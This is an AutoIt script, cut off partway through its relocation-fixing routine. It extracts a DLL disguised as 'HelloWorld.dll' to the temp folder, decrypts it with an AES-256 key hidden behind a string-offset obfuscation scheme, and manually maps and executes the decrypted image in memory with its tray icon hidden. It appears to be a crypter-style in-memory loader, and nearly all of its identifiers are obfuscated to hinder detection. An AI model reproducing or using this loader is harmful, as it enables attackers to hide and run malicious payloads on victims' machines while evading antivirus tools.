#NoTrayIcon
#include <WinAPI.au3>
#include <Memory.au3>
#include <Crypt.au3>

FileInstall("HelloWorld.dll", @TempDir & "/HelloWorld.dll", 1)
$FILE = BINDLL(@TempDir & "/HelloWorld.dll")
_CRYPT_STARTUP()
$TEMP_DECRYPTED = BINARYTOSTRING(_CRYPT_DECRYPTDATA($FILE, STRINGDEC("usjrahxtezaapqoxpojhugijiagzyf", "-15,-9,5,4,7,16,-9,4,3,-15,23,21,3,1,0,-10,-2,-1,7,14,-11,9,9,6,-1,19,13,-23,-23,14"), $CALG_AES_256))
Global $HDLL = DLLFROMMEMORY($TEMP_DECRYPTED)
DLLCLOSE($HDLL)
Func BINDLL($SFILE)
	Local $HFILE = FILEOPEN($SFILE, 16)
	Local $BBINARY = FILEREAD($HFILE)
	FILECLOSE($HFILE)
	Return $BBINARY
EndFunc   ;==>BINDLL
Func DLLFROMMEMORY($BBINARYIMAGE)
	Local $TBINARY = DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & BINARYLEN($BBINARYIMAGE) & "]")
	DLLSTRUCTSETDATA($TBINARY, 1, $BBINARYIMAGE)
	Local $PPOINTER = DLLSTRUCTCREATEHOOK($TBINARY)
	Local $TIMAGE_DOS_HEADER = DLLSTRUCTCREATE(STRINGDEC("cafcpiykeudtenowwkcwacdibognfe", "0,7,-5,15,-80,-28,-24,-4,4,-18,-9,-66,-8,-51") & STRINGDEC("ubkwizcimjccdlngsyozqnmibctpmy", "2,13,7,-19,-73,-56,22,11,-8,9,-20,11,-24,-11,5,13,-35,-24,-8,-21,-54") & STRINGDEC("jkmnqgfdegisgbolkjuviexnjchhmj", "13,4,5,-10,-81,-23,-5,3,0,12,-46") & STRINGDEC("juwfbhmxssmocpwtpbcobugkqfdcsx", "13,-6,-5,-2,-66,-22,-8,-12,-4,-16,-12,5,6,-1,-9,-1,-53") & STRINGDEC("ororjsbobfeuexuctebiilpjrlwbzr", "8,-3,3,-14,-74,-32,7,11,3,9,1,-45,0,-23,-17,2,-2,-42") & STRINGDEC("yukurzknzqmfrnbgfeknadgrlcswyd", "-2,-6,7,-17,-82,-45,-2,0,-17,-4,8,7,-45,10,18,11,-5,-42") & STRINGDEC("hcitseforjnbwwlesemwhzsnsofyji", "15,12,9,-16,-83,-24,-5,9,-9,3,7,11,-50,1,8,13,-18,-42") & STRINGDEC("pcmexevhoapcnowlhnqvbmfdgzwdtb", "7,12,5,-1,-88,-18,-35,-45") & STRINGDEC("nfvqivdzbivpwjjjsfyhgurvhktyga", "9,9,-4,-13,-73,-35,-20,-63") & STRINGDEC("iqydohopzirvzgokzikhdtrfrtinsr", "14,-2,-7,0,-79,-37,-7,-11,-23,2,1,-1,-13,-44") & STRINGDEC("bbhshyiatjhkveqyxbnxvwhjxektqt", "21,13,10,-15,-72,-48,-25,-38") & STRINGDEC("woomgigoagyltoukvhgfvckhehksjr", "0,0,3,-9,-71,-38,-20,-52") & STRINGDEC("knlkwzunftsaagncrdvuhpvaxdquzx", "12,1,6,-7,-87,-40,-16,-2,9,-17,-18,19,8,8,0,-40") & STRINGDEC("wtdvwapqykauuhxanlidtihynoqjfc", "0,-5,14,-18,-87,-18,6,-12,-7,1,0,4,-58") & STRINGDEC("jblctkcwzafjjioqysnjrwngwtnmrd", "-7,6,-11,15,-84,-25,2,-4,-21,17,16,-5,-6,-14,-55,-20,-62") & STRINGDEC("wpaoqzttzejeftoafhonsuzlhxurjq", "0,-1,17,-11,-81,-43,-47,-39,-49,-1,-5,9,14,-11,-9,8,-1,10,-52") & STRINGDEC("bpsytbsqlyrrlgxuaqcfzgtdtdaygh", "21,-1,-1,-21,-84,-19,-46,-36,-35,-11,-12,-3,6,6,-23,-1,8,-2,11,-43") & STRINGDEC("ueqmamdbvlcyewgqnzlmsxoomyrhzj", "-18,3,-16,5,-65,-27,1,17,-17,6,19,-20,-1,-69,-12,-63,-62,-29,-49") & STRINGDEC("ynlokakmzhypfrkhblsjjpqbrtbhzm", "-21,9,3,3,-7,-65,-42,-9,-22,10,-20,3,13,-35,-5,-26,3,11,-46,14,-5,-40,-12,-1,-14,-15,16"), $PPOINTER)
	$PPOINTER += DLLSTRUCTGETDATA($TIMAGE_DOS_HEADER, STRINGDEC("dxokaffwazvbipoiudpyjghgnmrmtj", "-35,-20,-11,7,4,13,13,-40,5,-44,-17,21,-36,8,-10,-33,-16,-3,-12,-20,8"))
	Local $SMAGIC = DLLSTRUCTGETDATA($TIMAGE_DOS_HEADER, STRINGDEC("rijddzsrdudkbminhfxzclaedyujxh", "-37,-8,-3,5,-1"))
	If Not ($SMAGIC == "MZ") Then
		Return SETERROR(1, 0, 0)
	EndIf
	Local $TIMAGE_NT_SIGNATURE = DLLSTRUCTCREATE(STRINGDEC("vvxgrorfaveuzywnnofucsdksnzxpi", "-18,1,-9,11,-14,-79,-31,3,6,-8,-4,-1,-5,-7,-18"), $PPOINTER)
	$PPOINTER += 4
	If DLLSTRUCTGETDATA($TIMAGE_NT_SIGNATURE, STRINGDEC("hfvlslrfzlxtfvheabssvtkdrwjdvd", "-21,3,-15,2,-18,8,3,12,-21")) <> 17744 Then
		Return SETERROR(2, 0, 0)
	EndIf
	Local $TIMAGE_FILE_HEADER = DLLSTRUCTCREATE(STRINGDEC("retwkmufmhmqqqdufngfgdcsnpuhur", "5,10,-2,-19,-75,-32,-20,-3,-5,1,1,-12,-54") & STRINGDEC("jkyhbzkqgtbnrbyvhdlfukgrzrptzq", "13,4,-7,-4,-66,-44,10,-4,-5,-15,16,-31,-12,-15,-20,-19,12,5,3,8,-2,-48") & STRINGDEC("fgdaygtgtzkeiogftjplkmhulfitfm", "-2,16,11,17,-21,-71,-32,2,-7,-21,-39,-4,11,-10,-20,14,-19,3,0,-49") & STRINGDEC("zopsbydhesjliykcpzsrvtfauhflxz", "-22,8,-1,-1,2,-89,-20,7,4,-5,10,-7,9,-37,4,-16,9,-13,-17,-3,-10,-32,-5,1,-9,-3,-43") & STRINGDEC("flefcfumutnglnuaesxlfacuwsbvwu", "-2,11,10,12,1,-70,-39,8,-8,-18,-9,11,-29,-8,-34,24,8,-17,-9,0,13,-38") & STRINGDEC("sirkouutovjrulplwkbwilyyfdsrvn", "4,6,0,-7,-79,-34,-12,6,-10,-39,-4,-35,-5,8,-7,3,-9,-10,10,-47,-4,-11,-21,-20,12,-41") & STRINGDEC("bbvlnjrojihsqathczonmpdpebdxvt", "21,13,-4,-8,-78,-39,-10,-14,8,-8,-5,1,-12,17,-11,11,17,-17,-12,5"), $PPOINTER)
	Local $INUMBEROFSECTIONS = DLLSTRUCTGETDATA($TIMAGE_FILE_HEADER, STRINGDEC("gqpiikbiiqmkisxanzdkqymhrqxvgn", "-25,4,-3,-7,-4,7,-19,-3,-22,-12,-10,9,0,-4,-10,18"))
	$PPOINTER += 20
	Local $TMAGIC = DLLSTRUCTCREATE(STRINGDEC("ltdxfwynlbjsvdanyihkuqwdrviztg", "11,-5,14,-20,-70,-42,-24,-7,-3,1,-47"), $PPOINTER)
	Local $IMAGIC = DLLSTRUCTGETDATA($TMAGIC, 1)
	Local $TIMAGE_OPTIONAL_HEADER
	If $IMAGIC = 267 Then
		If @AutoItX64 Then Return SETERROR(3, 0, 0)
		$TIMAGE_OPTIONAL_HEADER = DLLSTRUCTCREATE(STRINGDEC("ltdxfwynlbjsvdanyihkuqwdrviztg", "11,-5,14,-20,-70,-42,-24,-7,-3,1,-47") & STRINGDEC("phtmbpkyvjtldmaevyoqfpsajvfkyr", "-14,17,0,-8,-66,-35,-10,-15,-7,8,-40,-3,10,-2,4,13,-32,-20,3,2,3,-1,-5,-38") & STRINGDEC("pfrvamtwlzvahdajmnfnixukxqvjcn", "-14,19,2,-17,-65,-32,-11,-9,3,-8,-42,8,6,7,4,8,-23,-9,12,5,0,-9,-7,-48") & STRINGDEC("zznqemumdcjfgbjqcxcfzdkzjgzraf", "-22,-3,1,1,-1,-77,-34,-4,22,2,-27,0,-36,13,-6,-12,-40") & STRINGDEC("tgdxlnriionmhcmirelnaeboiclffe", "-16,16,11,-6,-8,-78,-31,0,17,-10,-31,-7,-31,11,-4,11,-9,-4,0,-5,25,0,2,-43,-8,17,-11,-43") & STRINGDEC("anejkuipptdxyzpklmpuxkhkxqwuub", "3,9,10,8,-7,-85,-22,-7,10,-15,-21,-18,-36,-12,-7,3,-3,7,-7,-20,-12,-2,18,-6,-20,-45,-22,-1,-20,-39") & STRINGDEC("cyotrfodsvhtzmzgavlxjcmpzjmpnq", "1,-2,0,-2,-14,-70,-46,0,-15,-4,-3,-1,-7,-30,-20,-34,13,-2,6,1,-26,12,-4,-2,-6,-47") & STRINGDEC("ieqdjchuvhvquaxaaxfeicstnprmjy", "-5,18,-2,14,-6,-67,-38,-20,-3,-3,-39,-11,-50,14,-20,4,-38") & STRINGDEC("rmoxhaieftsimilitgwvknhwnxxixz", "-14,10,0,-6,-4,-65,-39,-4,13,-15,-36,-3,-41,-8,8,-8,-57") & STRINGDEC("ehjyoiekhvhjqdhnshxigdwplgzdbw", "-1,15,5,-7,-11,-73,-28,2,-7,-15,-3,-40,-16,15,-3,-51") & STRINGDEC("exminvanugqcpyvxhdxhfyewdnjudn", "-1,-1,2,9,-10,-86,-14,-9,-18,13,-8,12,-2,-56,-10,-15,-1,10,-11,-3,8,-5,-42") & STRINGDEC("ikovgnghvtwulshxaacxinhwmhwwhi", "-5,12,0,-4,-3,-78,-33,1,-10,-15,-54,-9,-3,-12,6,-11,4,13,17,-61") & STRINGDEC("pkeodrwintgxsleputwcfakyqdjigk", "7,4,13,-11,-68,-37,-22,1,1,-2,-24,-8,-14,6,-4,4,-12,-6,-16,-16,19,18,9,-20,-4,-14,-5,9,12,-2,-1,3,-42") & STRINGDEC("rsgizxjiqxfvzvpjysgpvumwnmxvgg", "5,-4,11,-5,-90,-43,-1,5,-2,-6,-23,-6,-21,-4,-15,10,-16,-5,0,-29,3,-2,7,-18,-1,-23,-19,-4,12,2,-3,-5,-44") & STRINGDEC("ijyobiktanvrjgmgdsyofhppgikybt", "14,5,-7,-11,-66,-28,-10,-10,14,4,-45,-5,-9,0,-8,-17,1,-1,-6,-6,9,6,-53") & STRINGDEC("whlayssemmndzorobazycfqwpgbnpx", "0,7,6,3,-89,-38,-10,9,2,5,-37,9,-25,-8,-13,-25,3,17,-7,-16,12,8,-54") & STRINGDEC("uldpgdgovwxumqmmaaqgqyrwsdainm", "2,3,14,-12,-71,-23,-6,-5,-7,-5,-37,0,-11,2,12,6,19,4,-4,-17,-12,-7,1,-14,-4,10,-38") & STRINGDEC("hfnduqnrlbroybqslnaqoogukwuauv", "15,9,4,0,-85,-36,-5,-4,3,16,-31,6,-23,17,8,0,8,-9,12,-27,-10,3,12,-12,4,-9,-58") & STRINGDEC("nqpaymclyzlckbvmscnwxywpjhkamg", "-10,6,-1,17,-21,-77,-12,-3,-11,-71,-58,-13,-6,16,-3,-4,-4,11,-24,-22,-12,-4,-18,-53") & STRINGDEC("faxgbzxuuvjkpasfhvbxxknkonfdel", "-2,22,-9,11,2,-90,-37,-12,5,-17,-27,-5,-39,12,-18,1,-3,-59") & STRINGDEC("gnobcrxmwoyuussmjbbpxzefcjmlve", "-3,9,0,16,1,-82,-37,-4,3,-10,-42,-15,-45,-14,-18,-9,-5,16,17,-53") & STRINGDEC("ieyxrrajxyexgteibukaitgbzhpdkv", "-5,18,-10,-6,-14,-82,-30,-2,-19,-22,6,-37,14,-7,-42") & STRINGDEC("cdjqrrkrxphgwfhemgenaxowhhhhmw", "20,11,8,-13,-82,-31,10,-16,-5,9,11,13,-18,7,-45") & STRINGDEC("haihznoatxwzjhtxfddiskisnhgxyj", "15,14,9,-4,-90,-42,-3,11,-49,-16,-22,-8,-9,-5,0,-19,12,5,15,11,-10,-8,10,-56") & STRINGDEC("hvwuctdpudbiwukfefxlukkajrxhml", "-4,1,-8,-3,1,-84,-17,-7,5,1,-19,-3,-36,-1,-10,-3,6,-20,-19,7,-16,7,11,4,-47") & STRINGDEC("xpyocpucykwklmcgpnjfxxvgxrqzvn", "-20,7,-10,3,1,-80,-34,6,1,-6,-40,-5,-25,7,-2,-4,-5,-43,5,7,-11,-15,-2,-44") & STRINGDEC("itqjjtiqkyprnswzkdzxizyyvyflwz", "-5,3,-2,8,-6,-84,-22,-8,15,-20,-33,-12,-38,-14,-22,-10,-25,1,-7,-19,9,-4,-20,-62") & STRINGDEC("wcpvnygzkdwoiefiynhkyiymolexfb", "-19,20,-1,-4,-10,-89,-20,-17,15,1,-40,-9,-33,0,-5,7,-54,1,5,2,-16,11,-62") & STRINGDEC("sxefhvsraekvuxabluizrsvvnrtxgg", "-15,-1,10,12,-4,-86,-39,-3,0,-1,-6,-4,-47,-12,0,5,7,-58") & STRINGDEC("otffztxddrgbujlpiyxifduzuypdjq", "-11,3,9,12,-22,-84,-42,17,9,-16,-2,16,-38,-4,-26,6,-8,-56,-10,-5,-19,5,5,-21,-2"), $PPOINTER)
		$PPOINTER += 96
	ElseIf $IMAGIC = 523 Then
		If Not @AutoItX64 Then Return SETERROR(3, 0, 0)
		$TIMAGE_OPTIONAL_HEADER = DLLSTRUCTCREATE(STRINGDEC("ltdxfwynlbjsvdanyihkuqwdrviztg", "11,-5,14,-20,-70,-42,-24,-7,-3,1,-47") & STRINGDEC("phtmbpkyvjtldmaevyoqfpsajvfkyr", "-14,17,0,-8,-66,-35,-10,-15,-7,8,-40,-3,10,-2,4,13,-32,-20,3,2,3,-1,-5,-38") & STRINGDEC("pfrvamtwlzvahdajmnfnixukxqvjcn", "-14,19,2,-17,-65,-32,-11,-9,3,-8,-42,8,6,7,4,8,-23,-9,12,5,0,-9,-7,-48") & STRINGDEC("zznqemumdcjfgbjqcxcfzdkzjgzraf", "-22,-3,1,1,-1,-77,-34,-4,22,2,-27,0,-36,13,-6,-12,-40") & STRINGDEC("tgdxlnriionmhcmirelnaeboiclffe", "-16,16,11,-6,-8,-78,-31,0,17,-10,-31,-7,-31,11,-4,11,-9,-4,0,-5,25,0,2,-43,-8,17,-11,-43") & STRINGDEC("anejkuipptdxyzpklmpuxkhkxqwuub", "3,9,10,8,-7,-85,-22,-7,10,-15,-21,-18,-36,-12,-7,3,-3,7,-7,-20,-12,-2,18,-6,-20,-45,-22,-1,-20,-39") & STRINGDEC("cyotrfodsvhtzmzgavlxjcmpzjmpnq", "1,-2,0,-2,-14,-70,-46,0,-15,-4,-3,-1,-7,-30,-20,-34,13,-2,6,1,-26,12,-4,-2,-6,-47") & STRINGDEC("ieqdjchuvhvquaxaaxfeicstnprmjy", "-5,18,-2,14,-6,-67,-38,-20,-3,-3,-39,-11,-50,14,-20,4,-38") & STRINGDEC("lrbrvkwljjlvqewtjweaygvboxavrf", "9,-9,12,2,-64,-55,-87,-35,3,-9,-5,-17,-47,-4,-4,-15,-47") & STRINGDEC("exminvanugqcpyvxhdxhfyewdnjudn", "-1,-1,2,9,-10,-86,-14,-9,-18,13,-8,12,-2,-56,-10,-15,-1,10,-11,-3,8,-5,-42") & STRINGDEC("ikovgnghvtwulshxaacxinhwmhwwhi", "-5,12,0,-4,-3,-78,-33,1,-10,-15,-54,-9,-3,-12,6,-11,4,13,17,-61") & STRINGDEC("pkeodrwintgxsleputwcfakyqdjigk", "7,4,13,-11,-68,-37,-22,1,1,-2,-24,-8,-14,6,-4,4,-12,-6,-16,-16,19,18,9,-20,-4,-14,-5,9,12,-2,-1,3,-42") & STRINGDEC("rsgizxjiqxfvzvpjysgpvumwnmxvgg", "5,-4,11,-5,-90,-43,-1,5,-2,-6,-23,-6,-21,-4,-15,10,-16,-5,0,-29,3,-2,7,-18,-1,-23,-19,-4,12,2,-3,-5,-44") & STRINGDEC("ijyobiktanvrjgmgdsyofhppgikybt", "14,5,-7,-11,-66,-28,-10,-10,14,4,-45,-5,-9,0,-8,-17,1,-1,-6,-6,9,6,-53") & STRINGDEC("whlayssemmndzorobazycfqwpgbnpx", "0,7,6,3,-89,-38,-10,9,2,5,-37,9,-25,-8,-13,-25,3,17,-7,-16,12,8,-54") & STRINGDEC("uldpgdgovwxumqmmaaqgqyrwsdainm", "2,3,14,-12,-71,-23,-6,-5,-7,-5,-37,0,-11,2,12,6,19,4,-4,-17,-12,-7,1,-14,-4,10,-38") & STRINGDEC("hfnduqnrlbroybqslnaqoogukwuauv", "15,9,4,0,-85,-36,-5,-4,3,16,-31,6,-23,17,8,0,8,-9,12,-27,-10,3,12,-12,4,-9,-58") & STRINGDEC("nqpaymclyzlckbvmscnwxywpjhkamg", "-10,6,-1,17,-21,-77,-12,-3,-11,-71,-58,-13,-6,16,-3,-4,-4,11,-24,-22,-12,-4,-18,-53") & STRINGDEC("faxgbzxuuvjkpasfhvbxxknkonfdel", "-2,22,-9,11,2,-90,-37,-12,5,-17,-27,-5,-39,12,-18,1,-3,-59") & STRINGDEC("gnobcrxmwoyuussmjbbpxzefcjmlve", "-3,9,0,16,1,-82,-37,-4,3,-10,-42,-15,-45,-14,-18,-9,-5,16,17,-53") & STRINGDEC("ieyxrrajxyexgteibukaitgbzhpdkv", "-5,18,-10,-6,-14,-82,-30,-2,-19,-22,6,-37,14,-7,-42") & STRINGDEC("cdjqrrkrxphgwfhemgenaxowhhhhmw", "20,11,8,-13,-82,-31,10,-16,-5,9,11,13,-18,7,-45") & STRINGDEC("haihznoatxwzjhtxfddiskisnhgxyj", "15,14,9,-4,-90,-42,-3,11,-49,-16,-22,-8,-9,-5,0,-19,12,5,15,11,-10,-8,10,-56") & STRINGDEC("fxdtghgofffvfipskrarjwglsumils", "15,-15,10,0,-49,-52,-71,-28,3,20,-1,-39,0,-22,4,-18,-8,-7,-15,-13,9,-18,11,10,-14,-58") & STRINGDEC("vtrecaeijykmcbhuwuatuvngilhwbv", "-1,-11,-4,15,-45,-45,-69,-22,-1,1,-6,-30,3,-15,12,-20,-20,-10,-30,-5,-8,-9,-5,13,-46") & STRINGDEC("iaovcgmbsqfyywjjupuzspzasjjwmm", "12,8,-1,-2,-45,-51,-77,-15,-10,9,-1,-42,-19,-47,-5,-9,-5,-30,-16,-7,-14,2,-4,4,-56") & STRINGDEC("zldnfbilropcisfeguxfrysgszpxxg", "-5,-3,10,6,-48,-46,-73,-25,-9,11,-11,-20,-3,-43,-1,-4,9,-50,-9,7,-5,-16,1,-44") & STRINGDEC("sxefhvsraekvuxabluizrsvvnrtxgg", "-15,-1,10,12,-4,-86,-39,-3,0,-1,-6,-4,-47,-12,0,5,7,-58") & STRINGDEC("otffztxddrgbujlpiyxifduzuypdjq", "-11,3,9,12,-22,-84,-42,17,9,-16,-2,16,-38,-4,-26,6,-8,-56,-10,-5,-19,5,5,-21,-2"), $PPOINTER)
		$PPOINTER += 112
	Else
		Return SETERROR(3, 0, 0)
	EndIf
	Local $ISIZEOFIMAGE = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, STRINGDEC("zsegnrzltluwowczdwtnhmfmrwgesz", "-39,-10,21,-2,-31,-12,-49,1,-19,-5,-16"))
	Local $IENTRYPOINT = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, STRINGDEC("ecaylgmvcgunqzdwlwowleyvvmqubq", "-36,1,3,-7,-7,12,6,-39,3,-34,-7,6,1,-1,-20,-8,-3,-9,5"))
	Local $POPTIONALHEADERIMAGEBASE = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, STRINGDEC("piklccodxnprxusmndogiunpucofod", "-39,4,-10,-5,2,-33,-14,15,-19"))
	$PPOINTER += 8
	Local $TIMAGE_DIRECTORY_ENTRY_IMPORT = DLLSTRUCTCREATE(STRINGDEC("rohrkgdmncfrxlmcewguxyjlhjcbyb", "-14,8,7,0,-7,-71,-14,-4,4,17,15,-17,-12,-43,-9,1,13,-18,12,-2,-61,-89,-6,11,7,8,1,-66,-38,7,8,-10"), $PPOINTER)
	Local $PADDRESSIMPORT = DLLSTRUCTGETDATA($TIMAGE_DIRECTORY_ENTRY_IMPORT, STRINGDEC("vaxsqldqdfzpvxgvsyjbhlaivzeixa", "-32,8,-6,1,4,-11,8,-48,0,-2,-8,-11,-3,-5"))
	Local $ISIZEIMPORT = DLLSTRUCTGETDATA($TIMAGE_DIRECTORY_ENTRY_IMPORT, STRINGDEC("htimftjivdahmcggkgdubendfivfhq", "-21,-11,17,-8"))
	$PPOINTER += 8
	$PPOINTER += 24
	Local $TIMAGE_DIRECTORY_ENTRY_BASERELOC = DLLSTRUCTCREATE(STRINGDEC("rohrkgdmncfrxlmcewguxyjlhjcbyb", "-14,8,7,0,-7,-71,-14,-4,4,17,15,-17,-12,-43,-9,1,13,-18,12,-2,-61,-89,-6,11,7,8,1,-66,-38,7,8,-10"), $PPOINTER)
	Local $PADDRESSNEWBASERELOC = DLLSTRUCTGETDATA($TIMAGE_DIRECTORY_ENTRY_BASERELOC, STRINGDEC("vaxsqldqdfzpvxgvsyjbhlaivzeixa", "-32,8,-6,1,4,-11,8,-48,0,-2,-8,-11,-3,-5"))
	Local $ISIZEBASERELOC = DLLSTRUCTGETDATA($TIMAGE_DIRECTORY_ENTRY_BASERELOC, STRINGDEC("htimftjivdahmcggkgdubendfivfhq", "-21,-11,17,-8"))
	$PPOINTER += 8
	$PPOINTER += 40
	$PPOINTER += 40
	Local $PBASEADDRESS = 0
	Local $BCLEANLOAD = UNMAPVIEWOFSECTION($PBASEADDRESS)
	$PBASEADDRESS = _MEMVIRTUALALLOC($PBASEADDRESS, $ISIZEOFIMAGE, $MEM_RESERVE + $MEM_COMMIT, $PAGE_READWRITE)
	Local $PHEADERSNEW = DLLSTRUCTCREATEHOOK($TIMAGE_DOS_HEADER)
	Local $IOPTIONALHEADERSIZEOFHEADERS = DLLSTRUCTGETDATA($TIMAGE_OPTIONAL_HEADER, STRINGDEC("uajndgscxoaqvmpmlewkyvswvbncum", "-34,8,16,-9,-21,-1,-43,2,-23,-11,4,1,-3"))
	VIRTUALPROTECT($PBASEADDRESS, $IOPTIONALHEADERSIZEOFHEADERS, $PAGE_READWRITE)
	If @error Then
		_WINAPI_FREELIBRARY($PBASEADDRESS)
		Return SETERROR(6, 0, 0)
	EndIf
	DLLSTRUCTSETDATA(DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $IOPTIONALHEADERSIZEOFHEADERS & "]", $PBASEADDRESS), 1, DLLSTRUCTGETDATA(DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $IOPTIONALHEADERSIZEOFHEADERS & "]", $PHEADERSNEW), 1))
	Local $TIMAGE_SECTION_HEADER
	Local $ISIZEOFRAWDATA, $PPOINTERTORAWDATA
	Local $IVIRTUALSIZE, $IVIRTUALADDRESS
	Local $TIMPRAW, $TRELOCRAW
	For $I = 1 To $INUMBEROFSECTIONS
		$TIMAGE_SECTION_HEADER = DLLSTRUCTCREATE(STRINGDEC("mojpoyssdxtpuzqpcnsiwelefhzgya", "-10,-7,-9,2,-79,-43,-18,-6,1,-29,-60,-19,-58") & STRINGDEC("vbldanmbhcsltynkaortgbgkjuimps", "-18,21,3,14,3,-78,-23,7,10,17,2,-11,-8,-38,-5,15,4,-52") & STRINGDEC("kkvvvluofzqkzuepcoybcytubbiggv", "-7,12,-7,-4,-18,-76,-31,-6,12,-6,4,-10,-14,-52,-1,-12,15,-10,-6,17,-40") & STRINGDEC("qetrjgnlxlvegjkdznybdrcuijzsol", "-13,18,-5,0,-6,-71,-27,-3,2,-7,-39,1,-21,-9,12,-32,-25,6,-24,-39") & STRINGDEC("blvsrzcrailshptfaqyyeetseetdbz", "2,11,-7,-1,-14,-90,-19,-3,8,5,8,-14,10,-28,-5,-20,0,6,-53,-24,15,-4,-57") & STRINGDEC("tqkctmpbsvhhkdkgmqnibxhpkatykb", "-16,6,4,15,-16,-77,-32,13,-10,-8,12,-3,7,-16,4,-21,-8,-5,1,-6,-1,-4,1,-1,3,18,-57") & STRINGDEC("nhnevjsryrvozfdrhezcxeomkkmhus", "-10,15,1,13,-18,-74,-35,-3,-16,-4,-2,-10,-8,-18,11,-38,1,9,-21,11,-3,8,-13,-8,7,8,-50") & STRINGDEC("rqejsmymxcjnxkzbsbxujapidccihv", "5,-2,13,-6,-83,-31,-4,0,-22,2,8,-31,-18,-25,-21,10,-4,1,-23,-1,-1,14,-2,10,-41") & STRINGDEC("sgnndtmmzqymlnyidyqlpxkocogaza", "4,8,4,-10,-68,-38,8,0,-24,-12,-7,-30,-6,-34,-16,5,1,-11,4,1,-14,-19,7,4,-40") & STRINGDEC("hupkjmgzcrxevtxtowwoteiqwftdex", "-4,2,-1,7,-6,-77,-36,-18,-2,0,-23,-2,-2,-15,-6,-11,4,-3,-14,-12,-1"), $PPOINTER)
		$ISIZEOFRAWDATA = DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, STRINGDEC("lohkljtmkwobrarxhbfwcbacdanqnx", "-25,-6,18,-6,-29,-4,-34,-12,12,-51,-14,18,-17"))
		$PPOINTERTORAWDATA = $PHEADERSNEW + DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, STRINGDEC("xttkphmeylgmqkmwftqcvvtehxhceq", "-40,-5,-11,3,4,-3,5,-17,-10,-26,-6,10,-45,-10,7,-22"))
		$IVIRTUALADDRESS = DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, STRINGDEC("vaxsqldqdfzpvxgvsyjbhlaivzeixa", "-32,8,-6,1,4,-11,8,-48,0,-2,-8,-11,-3,-5"))
		$IVIRTUALSIZE = DLLSTRUCTGETDATA($TIMAGE_SECTION_HEADER, STRINGDEC("bolwjztsooyqtkwojkfjcewunjrbrl", "-12,-6,6,-3,11,-25,-8,-32,-6,11,-20"))
		If $IVIRTUALSIZE And $IVIRTUALSIZE < $ISIZEOFRAWDATA Then $ISIZEOFRAWDATA = $IVIRTUALSIZE
		VIRTUALPROTECT($PBASEADDRESS + $IVIRTUALADDRESS, $IVIRTUALSIZE, $PAGE_EXECUTE_READWRITE)
		If @error Then
			$PPOINTER += 40
			ContinueLoop
		EndIf
		DLLSTRUCTSETDATA(DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $IVIRTUALSIZE & "]", $PBASEADDRESS + $IVIRTUALADDRESS), 1, DLLSTRUCTGETDATA(DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $IVIRTUALSIZE & "]"), 1))
		If $ISIZEOFRAWDATA Then
			DLLSTRUCTSETDATA(DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $ISIZEOFRAWDATA & "]", $PBASEADDRESS + $IVIRTUALADDRESS), 1, DLLSTRUCTGETDATA(DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $ISIZEOFRAWDATA & "]", $PPOINTERTORAWDATA), 1))
		EndIf
		If $IVIRTUALADDRESS <= $PADDRESSIMPORT And $IVIRTUALADDRESS + $ISIZEOFRAWDATA > $PADDRESSIMPORT Then
			$TIMPRAW = DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $ISIZEIMPORT & "]", $PPOINTERTORAWDATA + ($PADDRESSIMPORT - $IVIRTUALADDRESS))
			FIXIMPORTS($TIMPRAW, $PBASEADDRESS)
		EndIf
		If $IVIRTUALADDRESS <= $PADDRESSNEWBASERELOC And $IVIRTUALADDRESS + $ISIZEOFRAWDATA > $PADDRESSNEWBASERELOC Then
			$TRELOCRAW = DLLSTRUCTCREATE(STRINGDEC("iyfyemhyqmldhzjikiefukojbszgwz", "-7,0,14,-20,-10") & $ISIZEBASERELOC & "]", $PPOINTERTORAWDATA + ($PADDRESSNEWBASERELOC - $IVIRTUALADDRESS))
		EndIf
		$PPOINTER += 40
	Next
	If $PADDRESSNEWBASERELOC And $ISIZEBASERELOC Then FIXRELOC($TRELOCRAW, $PBASEADDRESS, $POPTIONALHEADERIMAGEBASE, $IMAGIC = 523)
	Local $PENTRYFUNC = $PBASEADDRESS + $IENTRYPOINT
	If $IENTRYPOINT Then DLLCALLADDRESS(STRINGDEC("bgerenbiyscuvxftpthytojojwggvx", "0,8,10,-6"), $PENTRYFUNC, STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), $PBASEADDRESS, STRINGDEC("fjmrgpoktxdxalfupypesalaixldpw", "-2,13,2,0,-3"), 1, STRINGDEC("whvjqzlpfkorqulxjmxmbcnireihzm", "-7,12,-4"), 0)
	If $BCLEANLOAD Then _WINAPI_FREELIBRARY($PBASEADDRESS)
EndFunc   ;==>DLLFROMMEMORY
Func FIXRELOC($TDATA, $PADDRESSNEW, $PADDRESSOLD, $FIMAGEX64)
	Local $IDELTA = $PADDRESSNEW - $PADDRESSOLD
	Local $ISIZE = DLLSTRUCTGETSIZE($TDATA)
	Local $PDATA = DLLSTRUCTCREATEHOOK($TDATA)
	Local $TIMAGE_BASE_RELOCATION, $IRELATIVEMOVE
	Local $IVIRTUALADDRESS, $ISIZEOFBLOCK, $INUMBEROFENTRIES
	Local $TENRIES, $IDATA, $TADDRESS
	Local $IFLAG = 3 + 7 * $FIMAGEX64
	While $IRELATIVEMOVE < $ISIZE
